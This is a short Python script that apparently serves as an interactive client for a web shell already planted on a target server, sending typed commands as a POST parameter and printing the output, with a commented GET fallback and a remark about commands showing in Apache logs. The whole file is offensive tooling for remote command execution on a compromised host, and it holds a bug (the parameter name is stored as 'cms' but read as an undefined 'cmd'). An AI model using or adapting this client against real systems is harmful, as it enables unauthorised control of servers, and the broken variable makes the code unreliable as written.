#! /usr/bin/python3

import requests
import argparse
import sys


parser = argparse.ArgumentParser('get a webshell with url, and use <param> as command post param (by default cmd)')
parser.add_argument('url')
parser.add_argument('--cmd', default='cmd')

args = parser.parse_args()

url = args.url
cms = args.cmd


s = requests.Session()

while True:
    c = input('--> ')
    r = s.post(url, data={cmd: c})
    # use this in place of post if you can't make post requests (commands are displayeds in apache logs)
    #r = s.get(url, params={cmd: c})
    print(r.request.url)
    t = r.text
    print(t)


